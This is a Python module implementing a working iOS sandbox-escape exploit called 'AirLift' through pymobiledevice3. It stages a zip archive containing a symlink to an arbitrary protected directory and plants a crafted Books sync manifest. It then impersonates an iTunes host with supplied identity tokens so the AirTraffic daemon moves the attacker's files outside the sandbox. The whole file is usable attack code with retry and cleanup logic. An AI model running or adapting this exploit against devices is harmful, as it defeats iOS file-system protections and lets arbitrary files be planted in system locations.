"""Cross-platform AirLift driver (ATAirlock sandbox escape) on pymobiledevice3.

This is a pure-Python port of 0xjohnnydev/airlift (whose device communication
lives in the C helpers ``device_helper.m`` / ``airtraffic_host.m`` over the
macOS-only MobileDevice.framework) that works on any host where pymobiledevice3
can reach the device: Linux, Windows or macOS, over USB or whatever transport
the ``lockdown_session`` provides.

The port is modelled on the AirCard-iOS ``exploit.rs`` FFI (``Mak5er/AirCard``),
which implements the same pipeline on plain lockdown services:

1. **Stage**  - push a ``com.apple.streaming_zip_conduit`` archive that plants
   a symlink plus the target directory tree under ``/var/mobile/Media``, and
   put a crafted ``Books/Sync/Books.plist`` manifest in place over AFC.
2. **Sync**   - run a Books AirTraffic session on ``com.apple.atc`` so
   ``ATAirlock`` moves those assets into the symlink target (an arbitrary
   sandbox-external directory such as ``/var/mobile/Library/Caches``).
3. **Finish** - clean up and restore the original Books state.

Only **new** files can be written: ATAirlock uses a rename, so writing over an
existing file fails. A directory tree whose name is not yet present on the
device is created by the staged archive.

Usage (async)::

    async with lockdown_session(serial) as lockdown:
        result = await write_files(
            lockdown, "/var/mobile/Library/Caches/TelephonyUI-10",
            [("en-1---white.png", png_bytes), ...],
            log_cb=lambda msg: print(msg),
        )

Device/build gate: only physical iPhones are supported; verified builds are
listed in :data:`TESTED_BUILDS`. Everything else is warned about but not blocked.
"""

from __future__ import annotations

import asyncio
import io
import logging
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import uuid
import zipfile
from functools import lru_cache
from typing import Any, Callable, Optional

from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.services.afc import AfcService

from .grappa import AUTHENTIC_GRAPPA_TOKENS, get_grappa_token

logger = logging.getLogger("GoldenNugget.airlift")

TESTED_BUILDS: frozenset[tuple[str, str]] = frozenset(
    {
        ("27.0", "24A435"),
        ("27.0", "24A5390f"),
    }
)

SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"

SZ_EXTRA_ID = 0x5A53

AT_C_SERVICE = "com.apple.atc"
STREAMING_ZIP_SERVICE = "com.apple.streaming_zip_conduit"

MAX_AT_C_ASSETS_PER_SESSION = 512

LogCallback = Callable[[str], None]


class AirliftError(RuntimeError):
    """Raised when the AirLift pipeline cannot proceed or fails."""


class AirTrafficSyncRejected(AirliftError):
    """The ATC daemon refused the sync session itself (SyncFailed observed).

    Every file in a batch would hit the same rejection, so degrading to
    per-file sessions is pointless — callers should fail fast instead.
    """


def check_target(lockdown: LockdownClient, log_cb: Optional[LogCallback] = None) -> dict[str, Any]:
    """Validate that the connected device is an AirLift-compatible iPhone."""
    log = log_cb or (lambda message: logger.debug(message))
    values = getattr(lockdown, "all_values", {})
    product = values.get("ProductType", "")
    version = values.get("ProductVersion", "")
    build = values.get("BuildVersion", "")
    if not isinstance(product, str) or not product.startswith("iPhone"):
        raise AirliftError(
            f"AirLift requires a physical iPhone; got ProductType={product!r}"
        )
    if getattr(lockdown, "paired", True) is False:
        # A silently-unpaired client must never reach the sync: lockdownd
        # hosted services (ATC included) reject it and every session dies with
        # SyncFailed. Stop here and ask for the on-device trust dialog instead.
        raise AirliftError(
            "the host is not trusted by this iPhone — unlock the device and "
            'tap "Trust This Computer" when iOS asks, then try again'
        )
    tested = (version, build) in TESTED_BUILDS
    log(f"airlift: iPhone {product} on iOS {version} ({build})")
    if not tested:
        log(
            "airlift: warning: this iOS build is not in the verified set "
            f"(tested: {'; '.join(f'{v} {b}' for v, b in sorted(TESTED_BUILDS)) or 'none'})"
        )
    return {"product": product, "version": version, "build": build, "tested": tested}


def normalize_target(value: str) -> str:
    """Validate an absolute, non-root, hostile-free destination directory."""
    target = posixpath.normpath(value)
    if not target.startswith("/") or target == "/" or "\x00" in target:
        raise AirliftError("target must be a non-root absolute directory")
    components = target[1:].split("/")
    if any(component in ("", ".", "..") for component in components):
        raise AirliftError("target contains an unsafe path component")
    if len(target.encode()) > 768:
        raise AirliftError("target path is too long")
    return target


def _zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, files: list[tuple[str, bytes]]) -> bytes:
    """Build the StreamingZip conduit archive.

    Mirrors ``airlift.py build_archive`` / ``exploit.rs build_archive*``: the
    archive plants ``META-INF``, the ``p0/p1/p2`` scaffold with a symlink
    ``link -> ../../../{target_tail}``, one directory entry per target path
    component (so a missing directory is created by the first extraction) and
    the payload files (``payload`` or ``payload_{index}``).
    """
    target_tail = target[1:]
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(_zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(_zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(_zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for index, (_, payload) in enumerate(files):
            name = "payload" if len(files) == 1 else f"payload_{index}"
            archive.writestr(_zip_info(name, stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    """Build the crafted ``Books/Sync/Books.plist`` sync manifest."""
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def _bplist(payload: dict[str, Any]) -> bytes:
    return plistlib.dumps(payload, fmt=plistlib.FMT_BINARY, sort_keys=False)


async def _send_prefixed(connection, payload: bytes, endianness: str) -> None:
    await connection.sendall(struct.pack(endianness + "L", len(payload)) + payload)


async def _recv_prefixed(connection, endianness: str) -> bytes:
    return await connection.recv_prefixed(endianness)


@lru_cache(maxsize=None)
def _grappa_candidates() -> list[bytes]:
    """Candidate “Grappa” blobs for HostInfo/RequestingSync, in order.

    1. ``GOLDENNUGGET_ATC_GRAPPA`` (debug): raw hex override.
    2. macOS: genuine token from the AirTraffic private frameworks.
    3. Fallback: authentic CoreFP tokens (Apple's own host identity proof —
       device-agnostic; verified accepted by the ATC daemon on iOS 27).
    """
    value = os.environ.get("GOLDENNUGGET_ATC_GRAPPA", "").strip()
    if value:
        try:
            return [bytes.fromhex(value)]
        except ValueError:
            logger.warning("GOLDENNUGGET_ATC_GRAPPA is not valid hex, ignored")
    token = get_grappa_token()
    if token is not None:
        return [token]
    logger.warning(
        "airlift: no native Grappa token available; using authentic CoreFP "
        "tokens (host identity proof)"
    )
    return AUTHENTIC_GRAPPA_TOKENS


async def _send_atc_dict(connection, message: dict[str, Any]) -> None:
    await _send_prefixed(connection, _bplist(message), "<")


async def _recv_atc(connection) -> Optional[dict[str, Any]]:
    """Read one ATC message, sniffing the length-prefix endianness.

    AirTrafficHost natively uses little-endian prefixes; the device side is
    strict about it, but sniffing both orders keeps us resilient across firms.
    """
    raw = await connection.recvall(4)
    if not raw or len(raw) != 4:
        return None
    len_le = struct.unpack("<L", raw)[0]
    len_be = struct.unpack(">L", raw)[0]
    length = len_le if 0 < len_le <= 10 * 1024 * 1024 else len_be
    if not (0 < length <= 10 * 1024 * 1024):
        return None
    body = await connection.recvall(length)
    if not body:
        return None
    try:
        value = plistlib.loads(body)
    except Exception:
        return None
    return value if isinstance(value, dict) else None


def _atc_name(message: dict[str, Any]) -> Optional[str]:
    value = message.get("Command") or message.get("MessageName")
    return value if isinstance(value, str) else None


_DUMPED_MESSAGES = {
    "Capabilities",
    "SyncAllowed",
    "SyncFailed",
    "ReadyForSync",
    "AssetManifest",
    "Done",
    "SyncFinished",
}


def _shorten(message: dict[str, Any], limit: int = 800) -> str:
    """Render an ATC message for the log, truncating big payloads."""
    text = repr(message)
    return text if len(text) <= limit else text[:limit] + "...[truncated]"


class AirTrafficClient:
    """Session client for ``com.apple.atc``.

    Speaks the ATC framing used by AirTrafficHost (little-endian length-prefixed
    binary plists addressed by ``Command`` + ``Session``) and drives one full
    Books sync: Capabilities/SyncAllowed pump, HostInfo (session 0),
    RequestingSync + ReadyForSync (session 1), FinishedSyncingMetadata,
    AssetManifest and a ``FileComplete`` per asset. ``Ping`` keepalives receive
    a ``Pong`` reply throughout.
    """

    def __init__(self, connection, log_cb: Optional[LogCallback] = None):
        self.connection = connection
        self.log = log_cb or (lambda message: logger.debug(message))
        self.session = 1

    async def _receive(
        self,
        recognize,
        attempts: int,
        timeout: float,
        tolerate_sync_failed: bool = False,
        on_sync_failed: Optional[Callable[[dict[str, Any]], None]] = None,
    ):
        """Read ATC messages until one satisfies ``recognize``.

        ``Ping`` keepalives always get a ``Pong`` reply; a ``SyncFailed`` is a
        hard error unless ``tolerate_sync_failed`` is set (the daemon emits a
        prior-session cancellation before acknowledging a new session). When
        tolerated, ``on_sync_failed`` (if given) is called with the message so
        the caller can tell a benign stale-session abort from a real rejection.
        """
        for _ in range(attempts):
            try:
                message = await asyncio.wait_for(_recv_atc(self.connection), timeout)
            except (asyncio.TimeoutError, OSError, asyncio.CancelledError):
                return None
            if message is None:
                continue
            name = _atc_name(message)
            if name is None:
                continue
            self.log(f"atc: received '{name}'")
            if name in _DUMPED_MESSAGES:
                self.log(f"atc: << {_shorten(message)}")
            if name == "Ping":
                ping_session = message.get("Session", self.session)
                await _send_atc_dict(
                    self.connection, {"Command": "Pong", "Session": ping_session}
                )
                continue
            if name == "SyncFailed":
                if not tolerate_sync_failed:
                    raise AirliftError(f"AirTraffic sync failed: {message}")
                if on_sync_failed is not None:
                    on_sync_failed(message)
                continue
            if recognize(message):
                return message
        return None

    async def sync(self, assets: list[tuple[str, str]], grappa: Optional[bytes] = None) -> dict[str, Any]:
        """Run one Books sync session and emit ``FileComplete`` for ``assets``.

        Each tuple is ``(AssetID, AssetPath)`` as it appears in the staged
        ``Books/Sync/Books.plist`` and in the AssetManifest.  ``grappa`` pins
        the token for HostInfo/RequestingSync; when None the first resolved
        candidate (``_grappa_candidates``) is used.
        """
        if len(assets) > MAX_AT_C_ASSETS_PER_SESSION:
            raise AirliftError("too many assets for a single AirTraffic sync")

        # The daemon aborts a stale/prior session with SyncFailed before
        # accepting a new one; a tolerated SyncFailed is only noise unless it
        # is a genuine rejection that then never yields ReadyForSync — carry
        # its detail so a later "not observed" failure names the cause.
        sync_failed = {"count": 0, "detail": ""}

        def _note_sync_failed(message: dict[str, Any]) -> None:
            sync_failed["count"] += 1
            error = message.get("Error") or message.get("ErrorDescription") or ""
            if error:
                sync_failed["detail"] = str(error)
            self.log(
                f"atc: SyncFailed (session_abort) observed: {error or 'no detail'}")

        def _sync_failed_context() -> str:
            if not sync_failed["count"]:
                return ""
            detail = f" - {sync_failed['detail']}" if sync_failed["detail"] else ""
            return (f" the device turned the session down with SyncFailed"
                    f" (x{sync_failed['count']}{detail})")

        self.log("atc: waiting for Capabilities / SyncAllowed")
        sync_allowed = await self._receive(
            lambda message: _atc_name(message) == "SyncAllowed",
            12, 1.5, tolerate_sync_failed=True, on_sync_failed=_note_sync_failed,
        )
        if sync_allowed is None:
            # The daemon frequently cancels a stale/previous session with a
            # SyncFailed (ErrorCode 4) before accepting the new one — or it
            # never emits SyncAllowed at all. Neither case blocks the sync
            # (mirrors the reference Rust port, which proceeds regardless).
            self.log("atc: SyncAllowed not observed; proceeding anyway")
        elif sync_failed["count"]:
            self.log("atc: stale SyncFailed ignored, new session accepted")

        host_info = {
            "Type": "iTunes",
            "Version": "13.7.0.161",
            "MacOSVersion": "GoldenNugget",
            "SyncHostName": "airlift",
            "LibraryID": str(uuid.uuid4()),
            "SyncedDataclasses": ["Book"],
            "SyncedAssetTypes": ["Book"],
            "Wakeable": False,
        }
        grappa = grappa if grappa is not None else _grappa_candidates()[0]
        if grappa:
            host_info["Grappa"] = grappa
            self.log(f"atc: >> Grappa candidate {len(grappa)} bytes")
        self.log(f"atc: >> HostInfo {_shorten(host_info)}")
        await _send_atc_dict(
            self.connection,
            {
                "Command": "HostInfo",
                "Session": 0,
                "Params": {
                    "HostInfo": host_info,
                    "LocalCloudSupport": False,
                },
            },
        )
        await asyncio.sleep(0.2)

        self.log("atc: >> RequestingSync Dataclasses ['Book']")
        await _send_atc_dict(
            self.connection,
            {
                "Command": "RequestingSync",
                "Session": self.session,
                "Params": {
                    "Dataclasses": ["Book"],
                    "DataclassAnchors": {},
                    "HostInfo": host_info,
                },
            },
        )

        self.log("atc: waiting for ReadyForSync")
        ready = await self._receive(
            lambda message: _atc_name(message) in ("ReadyForSync", "AssetManifest"),
            24,
            5.0,
            tolerate_sync_failed=True,
            on_sync_failed=_note_sync_failed,
        )
        if ready is None:
            raise AirTrafficSyncRejected(
                "AirTraffic: ReadyForSync not observed;"
                f"{_sync_failed_context()}. Unlock the iPhone and keep it "
                "awake, open Apple Books once, and close other syncing clients."
            )

        await _send_atc_dict(
            self.connection,
            {
                "Command": "FinishedSyncingMetadata",
                "Session": self.session,
                "Params": {
                    "SyncTypes": {"Book": 1},
                    "DataclassAnchors": {},
                },
            },
        )

        self.log("atc: waiting for AssetManifest")
        manifest = await self._receive(
            lambda message: _atc_name(message) == "AssetManifest",
            20,
            5.0,
            tolerate_sync_failed=True,
            on_sync_failed=_note_sync_failed,
        )
        if manifest is None:
            raise AirTrafficSyncRejected(
                f"AirTraffic: AssetManifest not observed;{_sync_failed_context()}"
            )

        for index, (identifier, destination) in enumerate(assets):
            await _send_atc_dict(
                self.connection,
                {
                    "Command": "FileComplete",
                    "Session": self.session,
                    "Params": {
                        "AssetID": identifier,
                        "Dataclass": "Book",
                        "AssetPath": destination,
                    },
                },
            )
            if index + 1 < len(assets):
                await asyncio.sleep(0.9)

        await asyncio.sleep(2.0)
        return {"session": self.session, "fileCompleteMessages": len(assets)}


async def _snapshot_books(afc: AfcService) -> Optional[bytes]:
    try:
        if await afc.exists("Books/Sync/Books.plist"):
            return await afc.get_file_contents("Books/Sync/Books.plist")
    except Exception:
        pass
    return None


async def _restore_books(afc: AfcService, original: Optional[bytes]) -> None:
    for directory in ("Books", "Books/Sync"):
        try:
            if not await afc.exists(directory):
                await afc.makedirs(directory)
        except Exception:
            pass
    if original is None:
        try:
            if await afc.exists("Books/Sync/Books.plist"):
                await afc.rm_single("Books/Sync/Books.plist", force=True)
        except Exception:
            pass
    else:
        try:
            await afc.set_file_contents("Books/Sync/Books.plist", original)
        except Exception:
            pass


async def _afc_exists(afc: AfcService, path: str) -> bool:
    try:
        return await afc.exists(path)
    except Exception:
        return False


async def _stage_archive(
    lockdown: LockdownClient,
    afc: AfcService,
    source: str,
    archive: bytes,
    books_plist: bytes,
    first_payload: str = "payload",
) -> None:
    """Push the archive through StreamingZip and verify it landed in Media."""
    connection = await lockdown.start_lockdown_service(STREAMING_ZIP_SERVICE)
    try:
        await _send_prefixed(connection, _bplist({"MediaSubdir": source}), ">")
        await connection.sendall(archive)
        body = await _recv_prefixed(connection, ">")
        if not body:
            raise AirliftError("streaming_zip_conduit returned an empty response")
    finally:
        await connection.close()

    source_link = f"{source}/p0/p1/p2/link"
    source_payload = f"{source}/{first_payload}"
    if not (
        await _afc_exists(afc, source)
        and await _afc_exists(afc, source_link)
        and await _afc_exists(afc, source_payload)
    ):
        raise AirliftError(
            f"stage verification failed: extracted objects not present in Media ({source})"
        )

    for directory in ("Books", "Books/Sync"):
        if not await _afc_exists(afc, directory):
            await afc.makedirs(directory)
    await afc.set_file_contents("Books/Sync/Books.plist", books_plist)


async def _cleanup(
    afc: AfcService,
    source: Optional[str] = None,
    link_destination: Optional[str] = None,
) -> None:
    for path in (link_destination, source):
        if not path:
            continue
        try:
            if await _afc_exists(afc, path):
                await afc.rm(path, force=True)
        except Exception:
            pass


async def write_files(
    lockdown: LockdownClient,
    target_dir: str,
    files: list[tuple[str, bytes]],
    log_cb: Optional[LogCallback] = None,
) -> dict[str, Any]:
    """Write a batch of new files below ``target_dir`` via AirLift.

    A single AirTraffic session carries the whole batch; when that fails the
    batch degrades to one session per file (mirroring AirCard's write_dir).
    Files that cannot be written (already present, or other failures) are
    reported in ``failures``; the rest are still delivered.
    """
    log = log_cb or (lambda message: logger.debug(message))
    target = normalize_target(target_dir)
    check_target(lockdown, log)
    files = [(leaf, payload) for leaf, payload in files if leaf and payload]
    if not files:
        raise AirliftError("no files to write")

    afc = AfcService(lockdown)
    original_books = await _snapshot_books(afc)
    written: list[str] = []
    failures: list[str] = []

    try:
        token = secrets.token_hex(10)
        source = f"{SOURCE_PREFIX}{token}"
        link_destination = f"{LINK_PREFIX}{token}"
        link_identifier = f"../../{source}/p0/p1/p2/link"
        identifiers = [link_identifier] + [
            f"../../{source}/payload_{index}" for index in range(len(files))
        ]
        assets = [(link_identifier, link_destination)] + [
            (identifiers[index + 1], posixpath.join(link_destination, leaf))
            for index, (leaf, _) in enumerate(files)
        ]
        archive = build_archive(target, files)
        books_plist = build_books([identifier for identifier, _ in assets])

        log(f"airlift: batch staging {len(files)} files")
        await _stage_archive(
            lockdown, afc, source, archive, books_plist, first_payload="payload_0"
        )
        candidates = _grappa_candidates()
        last_rejected: Optional[AirTrafficSyncRejected] = None
        for candidate_index, grappa in enumerate(candidates):
            connection = await lockdown.start_lockdown_service(AT_C_SERVICE)
            try:
                await AirTrafficClient(connection, log).sync(assets, grappa=grappa)
                break
            except AirTrafficSyncRejected as handshake_error:
                last_rejected = handshake_error
                log(f"airlift: batch rejected ({handshake_error}); "
                    f"grappa candidate {candidate_index + 1}/{len(candidates)}")
            finally:
                await connection.close()
        else:
            raise last_rejected
        await _cleanup(afc, source=source, link_destination=link_destination)
        written.extend(leaf for leaf, _ in files)
    except AirTrafficSyncRejected as handshake_error:
        log(f"airlift: batch write rejected by the device ({handshake_error}); "
            "skipping per-file degrade (every file would hit the same rejection)")
        await _restore_books(afc, original_books)
        await afc.close()
        return {
            "targetDirectory": target,
            "written": [],
            "failures": [leaf for leaf, _ in files],
            "rejected": True,
            "ok": False,
        }
    except Exception as batch_error:
        log(f"airlift: batch write failed ({batch_error}); degrading to per-file")
        await _cleanup(afc, source=source, link_destination=link_destination)
        for leaf, payload in files:
            token = secrets.token_hex(10)
            source_single = f"{SOURCE_PREFIX}{token}"
            link_destination_single = f"{LINK_PREFIX}{token}"
            link_identifier_single = f"../../{source_single}/p0/p1/p2/link"
            payload_identifier_single = f"../../{source_single}/payload"
            assets_single = [
                (link_identifier_single, link_destination_single),
                (payload_identifier_single, posixpath.join(link_destination_single, leaf)),
            ]
            archive_single = build_archive(target, [(leaf, payload)])
            books_single = build_books([identifier for identifier, _ in assets_single])
            try:
                log(f"airlift: writing '{leaf}'")
                await _restore_books(afc, original_books)
                await _stage_archive(lockdown, afc, source_single, archive_single, books_single)
                single_connection = await lockdown.start_lockdown_service(AT_C_SERVICE)
                try:
                    await AirTrafficClient(single_connection, log).sync(assets_single)
                finally:
                    await single_connection.close()
                await _cleanup(afc, source=source_single, link_destination=link_destination_single)
                written.append(leaf)
            except AirTrafficSyncRejected as handshake_error:
                failures.append(leaf)
                log(f"airlift: write '{leaf}' failed: session rejected "
                    f"({handshake_error}); stopping per-file degrade")
                await _cleanup(afc, source=source_single, link_destination=link_destination_single)
                break
            except Exception as error:
                failures.append(leaf)
                log(f"airlift: write '{leaf}' failed: {error}")
                await _cleanup(afc, source=source_single, link_destination=link_destination_single)

    await _restore_books(afc, original_books)
    await afc.close()

    return {
        "targetDirectory": target,
        "written": written,
        "failures": failures,
        "ok": not failures,
    }
